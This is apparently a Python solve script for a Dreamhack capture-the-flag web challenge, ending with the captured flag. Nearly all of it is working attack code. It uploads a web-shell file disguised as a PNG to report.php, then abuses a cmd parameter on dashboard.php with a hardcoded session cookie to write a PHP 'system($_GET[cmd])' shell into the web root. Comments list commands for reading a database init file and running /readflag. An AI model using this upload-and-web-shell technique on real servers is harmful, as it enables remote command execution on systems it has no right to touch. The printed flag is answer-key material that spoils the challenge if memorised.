url = 'http://host1.dreamhack.games:12133'

import requests

fb = open('exploit.png', 'rb').read() # webshell
res = requests.post(url+'/report.php', files={'file': ('test.png', fb, 'image/png')}, data={'title':'test', 'content': 'test'})
png = res.text.strip("<script>alert('").split("'")[0]
print(">> ",url+'/report.php',"request", res.text)

res = requests.post(url+'/dashboard.php', cookies={"PHPSESSID":"4efdj5hpd6gv4e7d2a2ns7r9pp"}, data={"filename":"uploads/"+png, "cmd":"echo '<?php system($_GET[\"cmd\"]);' > /var/www/html/uploads/exploit.php"})
print(">> ",url+'/dashboard.php',"request", res.text)

# cat /docker-entrypoint-initdb.d/init.sql
# find . -exec cat /readflag \; -quit

# DH{M3rRy_ChristM4s!_th3_G1fT_1s_under_the_red_house_roof!}
